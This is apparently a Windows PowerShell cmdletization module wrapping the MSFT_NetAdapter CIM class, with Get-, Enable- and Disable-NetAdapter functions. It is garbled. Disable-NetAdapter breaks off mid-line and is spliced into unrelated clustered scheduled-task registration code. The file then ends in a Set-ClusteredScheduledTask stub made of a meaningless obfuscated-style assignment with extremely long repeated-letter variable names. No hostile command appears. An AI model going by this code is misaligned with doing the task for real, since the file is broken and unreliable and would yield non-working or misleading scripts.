#requires -version 3.0

try { Microsoft.PowerShell.Core\Set-StrictMode -Off } catch { }

$script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module

$script:ClassName = 'ROOT/StandardCimv2/MSFT_NetAdapter'
$script:ClassVersion = '1.0.0'
$script:ModuleVersion = '1.0'
$script:ObjectModelWrapper = [Microsoft.PowerShell.Cmdletization.Cim.CimCmdletAdapter]

$script:PrivateData = [System.Collections.Generic.Dictionary[string,string]]::new()

Microsoft.PowerShell.Core\Export-ModuleMember -Function @()
  

function __cmdletization_BindCommonParameters
{
param(
  $__cmdletization_objectModelWrapper,
  $myPSBoundParameters
)       
          

  if ($myPSBoundParameters.ContainsKey('CimSession')) { 
      $__cmdletization_objectModelWrapper.PSObject.Properties['CimSession'].Value 
= $myPSBoundParameters['CimSession'] 
  }
              

  if ($myPSBoundParameters.ContainsKey('ThrottleLimit')) { 
      
$__cmdletization_objectModelWrapper.PSObject.Properties['ThrottleLimit'].Value = 
$myPSBoundParameters['ThrottleLimit'] 
  }
              

  if ($myPSBoundParameters.ContainsKey('AsJob')) { 
      $__cmdletization_objectModelWrapper.PSObject.Properties['AsJob'].Value = 
$myPSBoundParameters['AsJob'] 
  }
              

}
          

function Get-NetAdapter
{
[CmdletBinding(DefaultParameterSetName='ByName', PositionalBinding=$false)]

[OutputType([Microsoft.Management.Infrastructure.CimInstance])]
[OutputType('Microsoft.Management.Infrastructure.CimInstance#ROOT/StandardCimv2/MSFT_NetA
dapter')]

param(

[Parameter(ParameterSetName='ByName', Position=0)]
[Alias('ifAlias','InterfaceAlias')]
[ValidateNotNull()]
[string[]]
${Name},

[Parameter(ParameterSetName='ByInstanceID', Mandatory=$true, 
ValueFromPipelineByPropertyName=$true)]
[Alias('ifDesc')]
[ValidateNotNull()]
[string[]]
${InterfaceDescription},

[Parameter(ParameterSetName='ByIfIndex', Mandatory=$true, 
ValueFromPipelineByPropertyName=$true)]
[Alias('ifIndex')]
[ValidateNotNull()]
[uint32[]]
${InterfaceIndex},

[Parameter(ParameterSetName='ByName')]
[Parameter(ParameterSetName='ByInstanceID')]
[Parameter(ParameterSetName='ByIfIndex')]
[switch]
${IncludeHidden},

[Parameter(ParameterSetName='ByName')]
[Parameter(ParameterSetName='ByInstanceID')]
[Parameter(ParameterSetName='ByIfIndex')]
[switch]
${Physical},

[Parameter(ParameterSetName='ByName')]
[Parameter(ParameterSetName='ByInstanceID')]
[Parameter(ParameterSetName='ByIfIndex')]
[Alias('Session')]
[ValidateNotNullOrEmpty()]
[CimSession[]]
${CimSession},

[Parameter(ParameterSetName='ByName')]
[Parameter(ParameterSetName='ByInstanceID')]
[Parameter(ParameterSetName='ByIfIndex')]
[int]
${ThrottleLimit},

[Parameter(ParameterSetName='ByName')]
[Parameter(ParameterSetName='ByInstanceID')]
[Parameter(ParameterSetName='ByIfIndex')]
[switch]
${AsJob})

DynamicParam {
  try 
  {
      if (-not $__cmdletization_exceptionHasBeenThrown)
      {
          $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
          $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, 
$script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

          if ($__cmdletization_objectModelWrapper -is 
[System.Management.Automation.IDynamicParameters])
          {
              ([System.Management.Automation.IDynamicParameters]$__cmdletization_ob
jectModelWrapper).GetDynamicParameters()
          }
      }
  }
  catch
  {
      $__cmdletization_exceptionHasBeenThrown = $true
      throw
  }
}

Begin {
  $__cmdletization_exceptionHasBeenThrown = $false
  try 
  {
      __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper 
$PSBoundParameters
      $__cmdletization_objectModelWrapper.BeginProcessing()
  }
  catch
  {
      $__cmdletization_exceptionHasBeenThrown = $true
      throw
  }
}
  

Process {
  try 
  {
      if (-not $__cmdletization_exceptionHasBeenThrown)
      {
$__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()
if ($PSBoundParameters.ContainsKey('Name') -and (@('ByName') -contains 
$PSCmdlet.ParameterSetName )) {
  $__cmdletization_values = @(${Name})
  $__cmdletization_queryBuilder.FilterByProperty('Name', $__cmdletization_values, 
$true, 'Default')
}
if ($PSBoundParameters.ContainsKey('InterfaceDescription') -and (@('ByInstanceID') 
-contains $PSCmdlet.ParameterSetName )) {
  $__cmdletization_values = @(${InterfaceDescription})
  $__cmdletization_queryBuilder.FilterByProperty('InterfaceDescription', 
$__cmdletization_values, $true, 'Default')
}
if ($PSBoundParameters.ContainsKey('InterfaceIndex') -and (@('ByIfIndex') -contains 
$PSCmdlet.ParameterSetName )) {
  $__cmdletization_values = @(${InterfaceIndex})
  $__cmdletization_queryBuilder.FilterByProperty('InterfaceIndex', 
$__cmdletization_values, $false, 'Default')
}
if ($PSBoundParameters.ContainsKey('IncludeHidden') -and (@('ByName', 
'ByInstanceID', 'ByIfIndex') -contains $PSCmdlet.ParameterSetName )) {
$__cmdletization_queryBuilder.AddQueryOption('IncludeHidden', ${IncludeHidden})
}
if ($PSBoundParameters.ContainsKey('Physical') -and (@('ByName', 'ByInstanceID', 
'ByIfIndex') -contains $PSCmdlet.ParameterSetName )) {
$__cmdletization_queryBuilder.AddQueryOption('Physical', ${Physical})
}


$__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder)
      }
  }
  catch
  {
      $__cmdletization_exceptionHasBeenThrown = $true
      throw
  }
}
  

End {
  try
  {
      if (-not $__cmdletization_exceptionHasBeenThrown)
      {
          $__cmdletization_objectModelWrapper.EndProcessing()
      }
  }
  catch
  {
      throw
  }
}

# .EXTERNALHELP MSFT_NetAdapter.cmdletDefinition.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Get-NetAdapter' -Alias '*'
  

function Enable-NetAdapter
{
[CmdletBinding(DefaultParameterSetName='ByName', SupportsShouldProcess=$true, 
ConfirmImpact='Medium', PositionalBinding=$false)]

[OutputType([Microsoft.Management.Infrastructure.CimInstance])]
param(

[Parameter(ParameterSetName='ByName', Mandatory=$true, Position=0)]
[Alias('ifAlias','InterfaceAlias')]
[ValidateNotNull()]
[string[]]
${Name},

[Parameter(ParameterSetName='ByInstanceID', Mandatory=$true, 
ValueFromPipelineByPropertyName=$true)]
[Alias('ifDesc')]
[ValidateNotNull()]
[string[]]
${InterfaceDescription},

[Parameter(ParameterSetName='ByName')]
[Parameter(ParameterSetName='ByInstanceID')]
[switch]
${IncludeHidden},

[Parameter(ParameterSetName='InputObject (cdxml)', Mandatory=$true, 
ValueFromPipeline=$true)]
[PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_NetAdapter')]
[ValidateNotNull()]
[ciminstance[]]
${InputObject},

[Parameter(ParameterSetName='ByName')]
[Parameter(ParameterSetName='ByInstanceID')]
[Parameter(ParameterSetName='InputObject (cdxml)')]
[switch]
${PassThru},

[Parameter(ParameterSetName='ByName')]
[Parameter(ParameterSetName='ByInstanceID')]
[Parameter(ParameterSetName='InputObject (cdxml)')]
[Alias('Session')]
[ValidateNotNullOrEmpty()]
[CimSession[]]
${CimSession},

[Parameter(ParameterSetName='ByName')]
[Parameter(ParameterSetName='ByInstanceID')]
[Parameter(ParameterSetName='InputObject (cdxml)')]
[int]
${ThrottleLimit},

[Parameter(ParameterSetName='ByName')]
[Parameter(ParameterSetName='ByInstanceID')]
[Parameter(ParameterSetName='InputObject (cdxml)')]
[switch]
${AsJob})

DynamicParam {
  try 
  {
      if (-not $__cmdletization_exceptionHasBeenThrown)
      {
          $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
          $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, 
$script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

          if ($__cmdletization_objectModelWrapper -is 
[System.Management.Automation.IDynamicParameters])
          {
              ([System.Management.Automation.IDynamicParameters]$__cmdletization_ob
jectModelWrapper).GetDynamicParameters()
          }
      }
  }
  catch
  {
      $__cmdletization_exceptionHasBeenThrown = $true
      throw
  }
}

Begin {
  $__cmdletization_exceptionHasBeenThrown = $false
  try 
  {
      __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper 
$PSBoundParameters
      $__cmdletization_objectModelWrapper.BeginProcessing()
  }
  catch
  {
      $__cmdletization_exceptionHasBeenThrown = $true
      throw
  }
}
  

Process {
  try 
  {
      if (-not $__cmdletization_exceptionHasBeenThrown)
      {
$__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()
if ($PSBoundParameters.ContainsKey('Name') -and (@('ByName') -contains 
$PSCmdlet.ParameterSetName )) {
  $__cmdletization_values = @(${Name})
  $__cmdletization_queryBuilder.FilterByProperty('Name', $__cmdletization_values, 
$true, 'Default')
}
if ($PSBoundParameters.ContainsKey('InterfaceDescription') -and (@('ByInstanceID') 
-contains $PSCmdlet.ParameterSetName )) {
  $__cmdletization_values = @(${InterfaceDescription})
  $__cmdletization_queryBuilder.FilterByProperty('InterfaceDescription', 
$__cmdletization_values, $true, 'Default')
}
if ($PSBoundParameters.ContainsKey('IncludeHidden') -and (@('ByName', 
'ByInstanceID') -contains $PSCmdlet.ParameterSetName )) {
$__cmdletization_queryBuilder.AddQueryOption('IncludeHidden', ${IncludeHidden})
}


$__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerS
hell.Cmdletization.MethodParameter]]::new()
switch -exact ($PSCmdlet.ParameterSetName) { 
  { @('ByName', 'ByInstanceID', 'InputObject (cdxml)') -contains $_ } {
    [object]$__cmdletization_defaultValue = $null
    [object]$__cmdletization_defaultValueIsPresent = $false
    if ($PSBoundParameters.ContainsKey('PassThru')) {
      [object]$__cmdletization_value = ${PassThru}
      $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 
'cim:OperationOption:PassThru'; ParameterType = 
'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = 
$__cmdletization_value; IsValuePresent = $true}
    } else {
      $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 
'cim:OperationOption:PassThru'; ParameterType = 
'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = 
$__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
    }
    $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

    [object]$__cmdletization_defaultValue = $null
    [object]$__cmdletization_defaultValueIsPresent = $false
      $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CmdletOutput'; 
ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'Out'; 
Value = $__cmdletization_defaultValue; IsValuePresent = 
$__cmdletization_defaultValueIsPresent}
    $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

$__cmdletization_returnValue = $null
$__cmdletization_methodInvocationInfo = 
[Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('Enable', 
$__cmdletization_methodParameters, $__cmdletization_returnValue)
$__cmdletization_passThru = $false
      if ($PSBoundParameters.ContainsKey('InputObject')) {
          foreach ($x in $InputObject) { 
$__cmdletization_objectModelWrapper.ProcessRecord($x, 
$__cmdletization_methodInvocationInfo, $__cmdletization_PassThru) }
      } else {
          
$__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder, 
$__cmdletization_methodInvocationInfo, $__cmdletization_PassThru)
      }
  }
}

      }
  }
  catch
  {
      $__cmdletization_exceptionHasBeenThrown = $true
      throw
  }
}
  

End {
  try
  {
      if (-not $__cmdletization_exceptionHasBeenThrown)
      {
          $__cmdletization_objectModelWrapper.EndProcessing()
      }
  }
  catch
  {
      throw
  }
}

# .EXTERNALHELP MSFT_NetAdapter.cmdletDefinition.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Enable-NetAdapter' -Alias '*'
  

function Disable-NetAdapter
{
[CmdletBinding(DefaultParameterSetName='ByName', SupportsShouldProcess=$true, 
ConfirmImpact='High', PositionalBinding=$false)]

[OutputType([Microsoft.Management.Infrastructure.CimInstance])]
param(

[Parameter(ParameterSetName='ByName', Mandatory=$true, Position=0)]
[Alias('ifAlias','InterfaceAlias')]
[ValidateNotNull()]
[string[]]
${Name},

[Parameter(ParameterSetName='ByInstanceID', Mandatory=$true, 
ValueFromPipelineByPropertyName=$true)]
[Alias('ifDesc')]
[ValidateNotNull()]
[string[]]
${InterfaceDescription},

[Parameter(ParameterSetName='ByName')]
[Parameter(ParameterSetName='ByInstanceID')]
[switch]
${IncludeHidden},

[Parameter(ParameterSetName='InputObject (cdxml)', Mandatory=$true, 
ValueFromPipeline=$true)]
[PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_NetAdapter')]
[ValidateNotNull()]
[ciminstance[]]
${InputObject},

[Parameter(ParameterSetName='ByName')]
[Parameter(ParameterSetName='ByInstanceID')]
[Parameter(ParameterSetName='InputObject (cdxml)
e = $__cmdletization_defaultValue; IsValuePresent = 
$__cmdletization_defaultValueIsPresent}
  }
  $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

  [object]$__cmdletization_defaultValue = $null
  [object]$__cmdletization_defaultValueIsPresent = $false
  if ($PSBoundParameters.ContainsKey('Resource')) {
    [object]$__cmdletization_value = ${Resource}
    $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Resource'; ParameterType = 
'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
  } else {
    $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Resource'; ParameterType = 
'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent 
= $__cmdletization_defaultValueIsPresent}
  }
  $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

  [object]$__cmdletization_defaultValue = $null
  [object]$__cmdletization_defaultValueIsPresent = $false
    $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CmdletOutput'; 
ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'Out'; 
Value = $__cmdletization_defaultValue; IsValuePresent = 
$__cmdletization_defaultValueIsPresent}
  $__cmdletization_methodParameter.ParameterTypeName = 
'Microsoft.Management.Infrastructure.CimInstance#MSFT_ClusteredScheduledTask'
  $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

$__cmdletization_returnValue = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; 
ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = 
$false }
$__cmdletization_methodInvocationInfo = 
[Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('RegisterByObject', 
$__cmdletization_methodParameters, $__cmdletization_returnValue)

$__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)
  }
  { @('Params') -contains $_ } {
  [object]$__cmdletization_defaultValue = $null
  [object]$__cmdletization_defaultValueIsPresent = $false
  if ($PSBoundParameters.ContainsKey('TaskName')) {
    [object]$__cmdletization_value = ${TaskName}
    $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskName'; ParameterType = 
'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
  } else {
    $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskName'; ParameterType = 
'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent 
= $__cmdletization_defaultValueIsPresent}
  }
  $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

  [object]$__cmdletization_defaultValue = $null
  [object]$__cmdletization_defaultValueIsPresent = $false
  if ($PSBoundParameters.ContainsKey('Settings')) {
    [object]$__cmdletization_value = ${Settings}
    $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Settings'; ParameterType = 
'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'In'; Value = 
$__cmdletization_value; IsValuePresent = $true}
  } else {
    $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Settings'; ParameterType = 
'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'In'; Value = 
$__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
  }
  $__cmdletization_methodParameter.ParameterTypeName = 
'Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskSettings'
  $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

  [object]$__cmdletization_defaultValue = $null
  [object]$__cmdletization_defaultValueIsPresent = $false
  if ($PSBoundParameters.ContainsKey('Description')) {
    [object]$__cmdletization_value = ${Description}
    $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Description'; 
ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; 
IsValuePresent = $true}
  } else {
    $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Description'; 
ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; 
IsValuePresent = $__cmdletization_defaultValueIsPresent}
  }
  $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

  [object]$__cmdletization_defaultValue = $null
  [object]$__cmdletization_defaultValueIsPresent = $false
  if ($PSBoundParameters.ContainsKey('Trigger')) {
    [object]$__cmdletization_value = ${Trigger}
    $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Trigger'; ParameterType = 
'Microsoft.Management.Infrastructure.CimInstance[]'; Bindings = 'In'; Value = 
$__cmdletization_value; IsValuePresent = $true}
  } else {
    $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Trigger'; ParameterType = 
'Microsoft.Management.Infrastructure.CimInstance[]'; Bindings = 'In'; Value = 
$__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
  }
  $__cmdletization_methodParameter.ParameterTypeName = 
'Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskTrigger'
  $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

  [object]$__cmdletization_defaultValue = $null
  [object]$__cmdletization_defaultValueIsPresent = $false
  if ($PSBoundParameters.ContainsKey('Cluster')) {
    [object]$__cmdletization_value = ${Cluster}
    $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Cluster'; ParameterType = 
'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
  } else {
    $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Cluster'; ParameterType = 
'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent 
= $__cmdletization_defaultValueIsPresent}
  }
  $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

  [object]$__cmdletization_defaultValue = $null
  [object]$__cmdletization_defaultValueIsPresent = $false
  if ($PSBoundParameters.ContainsKey('Action')) {
    [object]$__cmdletization_value = ${Action}
    $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Action'; ParameterType = 
'Microsoft.Management.Infrastructure.CimInstance[]'; Bindings = 'In'; Value = 
$__cmdletization_value; IsValuePresent = $true}
  } else {
    $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Action'; ParameterType = 
'Microsoft.Management.Infrastructure.CimInstance[]'; Bindings = 'In'; Value = 
$__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
  }
  $__cmdletization_methodParameter.ParameterTypeName = 
'Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskAction'
  $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

  [object]$__cmdletization_defaultValue = $null
  [object]$__cmdletization_defaultValueIsPresent = $false
  if ($PSBoundParameters.ContainsKey('TaskType')) {
    [object]$__cmdletization_value = ${TaskType}
    $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskType'; ParameterType = 
'Microsoft.PowerShell.Cmdletization.GeneratedTypes.ScheduledTask.ClusterTaskTypeEnum'; 
Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
  } else {
    $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskType'; ParameterType = 
'Microsoft.PowerShell.Cmdletization.GeneratedTypes.ScheduledTask.ClusterTaskTypeEnum'; 
Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = 
$__cmdletization_defaultValueIsPresent}
  }
  $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

  [object]$__cmdletization_defaultValue = $null
  [object]$__cmdletization_defaultValueIsPresent = $false
  if ($PSBoundParameters.ContainsKey('Resource')) {
    [object]$__cmdletization_value = ${Resource}
    $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Resource'; ParameterType = 
'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
  } else {
    $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Resource'; ParameterType = 
'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent 
= $__cmdletization_defaultValueIsPresent}
  }
  $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

  [object]$__cmdletization_defaultValue = $null
  [object]$__cmdletization_defaultValueIsPresent = $false
    $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CmdletOutput'; 
ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'Out'; 
Value = $__cmdletization_defaultValue; IsValuePresent = 
$__cmdletization_defaultValueIsPresent}
  $__cmdletization_methodParameter.ParameterTypeName = 
'Microsoft.Management.Infrastructure.CimInstance#MSFT_ClusteredScheduledTask'
  $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

$__cmdletization_returnValue = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; 
ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = 
$false }
$__cmdletization_methodInvocationInfo = 
[Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('RegisterByParams', 
$__cmdletization_methodParameters, $__cmdletization_returnValue)

$__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)
  }
  { @('Xml') -contains $_ } {
  [object]$__cmdletization_defaultValue = $null
  [object]$__cmdletization_defaultValueIsPresent = $false
  if ($PSBoundParameters.ContainsKey('Xml')) {
    [object]$__cmdletization_value = ${Xml}
    $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Xml'; ParameterType = 
'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
  } else {
    $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Xml'; ParameterType = 
'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent 
= $__cmdletization_defaultValueIsPresent}
  }
  $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

  [object]$__cmdletization_defaultValue = $null
  [object]$__cmdletization_defaultValueIsPresent = $false
  if ($PSBoundParameters.ContainsKey('TaskName')) {
    [object]$__cmdletization_value = ${TaskName}
    $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskName'; ParameterType = 
'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
  } else {
    $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskName'; ParameterType = 
'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent 
= $__cmdletization_defaultValueIsPresent}
  }
  $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

  [object]$__cmdletization_defaultValue = $null
  [object]$__cmdletization_defaultValueIsPresent = $false
  if ($PSBoundParameters.ContainsKey('Cluster')) {
    [object]$__cmdletization_value = ${Cluster}
    $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Cluster'; ParameterType = 
'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
  } else {
    $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Cluster'; ParameterType = 
'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent 
= $__cmdletization_defaultValueIsPresent}
  }
  $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

  [object]$__cmdletization_defaultValue = $null
  [object]$__cmdletization_defaultValueIsPresent = $false
  if ($PSBoundParameters.ContainsKey('TaskType')) {
    [object]$__cmdletization_value = ${TaskType}
    $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskType'; ParameterType = 
'Microsoft.PowerShell.Cmdletization.GeneratedTypes.ScheduledTask.ClusterTaskTypeEnum'; 
Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
  } else {
    $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskType'; ParameterType = 
'Microsoft.PowerShell.Cmdletization.GeneratedTypes.ScheduledTask.ClusterTaskTypeEnum'; 
Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = 
$__cmdletization_defaultValueIsPresent}
  }
  $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

  [object]$__cmdletization_defaultValue = $null
  [object]$__cmdletization_defaultValueIsPresent = $false
  if ($PSBoundParameters.ContainsKey('Resource')) {
    [object]$__cmdletization_value = ${Resource}
    $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Resource'; ParameterType = 
'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
  } else {
    $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Resource'; ParameterType = 
'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent 
= $__cmdletization_defaultValueIsPresent}
  }
  $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

  [object]$__cmdletization_defaultValue = $null
  [object]$__cmdletization_defaultValueIsPresent = $false
    $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CmdletOutput'; 
ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'Out'; 
Value = $__cmdletization_defaultValue; IsValuePresent = 
$__cmdletization_defaultValueIsPresent}
  $__cmdletization_methodParameter.ParameterTypeName = 
'Microsoft.Management.Infrastructure.CimInstance#MSFT_ClusteredScheduledTask'
  $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

$__cmdletization_returnValue = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; 
ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = 
$false }
$__cmdletization_methodInvocationInfo = 
[Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('RegisterByXml', 
$__cmdletization_methodParameters, $__cmdletization_returnValue)

$__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)
  }
}

      }
  }
  catch
  {
      $__cmdletization_exceptionHasBeenThrown = $true
      throw
  }
}
  

End {
  try
  {
      if (-not $__cmdletization_exceptionHasBeenThrown)
      {
          $__cmdletization_objectModelWrapper.EndProcessing()
      }
  }
  catch
  {
      throw
  }
}

# .EXTERNALHELP PS_ClusteredScheduledTask_v1.0.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 
'Register-ClusteredScheduledTask' -Alias '*'
  

function Set-ClusteredScheduledTask
{
[CmdletBinding(PositionalBinding=$false)]

[OutputType([Microsoft.Management.Infrastructure.CimInstance])]
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaa = "$($uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu
uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu
uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu
uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu
uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu)_$($zzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzz)"
return $aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
